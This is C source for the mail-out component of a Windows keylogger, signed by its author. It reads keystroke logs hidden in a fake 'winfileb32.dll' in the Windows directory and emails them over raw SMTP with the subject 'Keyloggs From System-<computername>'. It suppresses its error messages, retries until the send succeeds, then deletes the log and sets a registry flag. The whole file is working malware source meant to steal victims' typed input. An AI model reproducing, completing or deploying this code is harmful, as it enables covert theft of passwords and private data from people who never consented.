//////////////////////////////////////////////////////////////////////////
//		Coded by   Hirosh ,India										//
//////////////////////////////////////////////////////////////////////////
//					MSN hirr@hotmail.com								//	
//					yahoo hirosh22@yahoo.com							//
//					ICQ 109619370										//
//					Email :hirhirhir@hotpop.com							//	
//					www.hirosh.tk									//
//////////////////////////////////////////////////////////////////////////
//	I am the one mad from india	!!!!!!!									//	
//////////////////////////////////////////////////////////////////////////


#include "stdafx.h"
#include "stdlib.h"
#include <winsock2.h>
const    VERSION_MAJOR  = 1;     
const    VERSION_MINOR  = 1;
int error;
void Check( int iStatus)
{
	if (iStatus != SOCKET_ERROR && iStatus != 0) return;
	else{	error=1;	}
   
}
int sentattmail();
void sentfile()
{
int hhh=0;
HKEY hkeyresult ;
DWORD size = sizeof ( DWORD ) ;
char b[MAX_PATH];
while(hhh<4)
{	hhh++;
	if(sentattmail()==0){
	hhh=100;
	GetWindowsDirectory(b,MAX_PATH);
	strcat(b, "\\winfileb32.dll" );
	DeleteFile(b); 
	RegOpenKey ( HKEY_LOCAL_MACHINE, ( LPCTSTR ) "Software\\innsoft", &hkeyresult );
	RegSetValueEx ( hkeyresult, ( LPCTSTR )"innss" ,0, REG_SZ, ( const BYTE* ) ( LPCTSTR ) "1",1) ;
	RegCloseKey ( hkeyresult );
    break;		
	}
}
}

int sentattmail()
{

   WSADATA        WSData;
   LPHOSTENT      lpHostEntry;
   LPSERVENT      lpServEntry;
   SOCKADDR_IN    SockAddr;
   SOCKET         hServer;
   char           szBuffer[4096],szMsgLine[255];
   int            iProtocolPort;
   error=0;  
   if ( WSAStartup(MAKEWORD(VERSION_MAJOR, VERSION_MINOR), &WSData) ) 
   {
      // MessageBox(0,"Cannot find Winsock","Error",MB_OK);
        return(1);
   }

   lpHostEntry = gethostbyname( server );
   if (lpHostEntry == NULL) 
   {
      //MessageBox(0,"Cannot find SMTP mail server ","Error",MB_OK);
      return(1);
   }
   
   hServer = socket( PF_INET, SOCK_STREAM, 0); 
   if (hServer == INVALID_SOCKET) 
   {
      //MessageBox(0,"Cannot open mail server socket","Error",MB_OK);
      return(1);
   }
   lpServEntry = getservbyname( "mail", 0);
   if (lpServEntry == NULL)
     iProtocolPort = htons(IPPORT_SMTP);
   else
     iProtocolPort = lpServEntry->s_port;
   SockAddr.sin_family = AF_INET;
   SockAddr.sin_port = iProtocolPort;
   SockAddr.sin_addr = *((LPIN_ADDR)*lpHostEntry->h_addr_list);

   if (connect( hServer, (PSOCKADDR) &SockAddr, sizeof(SockAddr)))
   {
	//MessageBox(0,"Error connecting to Server socket","Error",MB_OK);
     return (1);
   }

   Check( recv( hServer, szBuffer, sizeof(szBuffer), 0));


   wsprintf( szMsgLine, "HELO %s%s", server, "\r\n");
   Check( send( hServer, szMsgLine, strlen(szMsgLine), 0));
   Check( recv( hServer, szBuffer, sizeof(szBuffer), 0));

   wsprintf( szMsgLine, "MAIL FROM:<%s>%s", "keys@hotpop.com", "\r\n");
   Check( send( hServer, szMsgLine, strlen(szMsgLine), 0));
   Check( recv( hServer, szBuffer, sizeof(szBuffer), 0));
  
   wsprintf( szMsgLine, "RCPT TO:<%s>%s", emailid, "\r\n");
   Check( send( hServer, szMsgLine, strlen(szMsgLine), 0));
   Check( recv( hServer, szBuffer, sizeof(szBuffer), 0));

    wsprintf( szMsgLine, "DATA%s", "\r\n");
   Check( send( hServer, szMsgLine, strlen(szMsgLine), 0));
   Check( recv( hServer, szBuffer, sizeof(szBuffer), 0));


	char sdate[70];
	lstrcpy(sdate,"Date: ");
	char s1s[70];
	GetDateFormat(0x409,0,0,"ddd,dd MMM yyyy",s1s,200);
	lstrcat(sdate,s1s);lstrcat(sdate," ");
	GetTimeFormat(0x409,0,0,"HH:mm:ss",s1s,200);
	lstrcat(sdate,s1s);	lstrcat(sdate," PM");

	DWORD dwSize; 
	char szBuffer1[MAX_COMPUTERNAME_LENGTH + 100];
	dwSize = MAX_COMPUTERNAME_LENGTH + 1;
	GetComputerName (szBuffer1, &dwSize);
	SYSTEMTIME stime;
	GetSystemTime(&stime);
	char subje[100];
	wsprintf(subje,"Subject: Keyloggs From System-%s ,%d'th Day",szBuffer1,stime.wDay);

lstrcpy(szMsgLine,"From: keys<keys@hotpop.com>\r\n");
lstrcat(szMsgLine,"To: ");lstrcat(szMsgLine,emailid);
lstrcat(szMsgLine,"\r\n");lstrcat(szMsgLine,subje);
lstrcat(szMsgLine,"\r\n");lstrcat(szMsgLine,sdate);lstrcat(szMsgLine,"\r\n");
lstrcat(szMsgLine,"X-Mailer: Hirs mailer\r\nMIME-Version: 1.0\r\nContent-Type: text/plain;\r\n\tcharset=\"iso-8859-1\"\r\nContent-Transfer-Encoding: 7bit\r\n\r\n");
Check( send( hServer, szMsgLine, strlen(szMsgLine), 0));

 	char b[MAX_PATH];
	GetWindowsDirectory(b,MAX_PATH);
	strcat(b, "\\winfileb32.dll" );
	HANDLE fd,fd2;
	char *buf;
	fd=CreateFile(b,GENERIC_READ,FILE_SHARE_READ,0,OPEN_EXISTING,
		FILE_ATTRIBUTE_ARCHIVE,0);
	DWORD dw,r;
	r=GetFileSize(fd,&dw);
	fd2=CreateFileMapping(fd,0,PAGE_READONLY,0,0,0);
	if(!fd2) {		CloseHandle(fd);		return 1;	}
	buf=(char *)MapViewOfFile(fd2,FILE_MAP_READ,0,0,0);
	if(!buf) {		CloseHandle(fd2);		CloseHandle(fd);		return 1;	}

Check( send( hServer, buf, r, 0));
UnmapViewOfFile(buf);
CloseHandle(fd2);
CloseHandle(fd);
   wsprintf( szMsgLine, "%s.%s", "\r\n", "\r\n");
   Check( send( hServer, szMsgLine, strlen(szMsgLine), 0));
   Check( recv( hServer, szBuffer, sizeof(szBuffer), 0));

   wsprintf( szMsgLine, "QUIT%s", "\r\n");
   Check( send( hServer, szMsgLine, strlen(szMsgLine), 0));
   Check( recv( hServer, szBuffer, sizeof(szBuffer), 0));

   closesocket( hServer );

   WSACleanup();

	return error;
}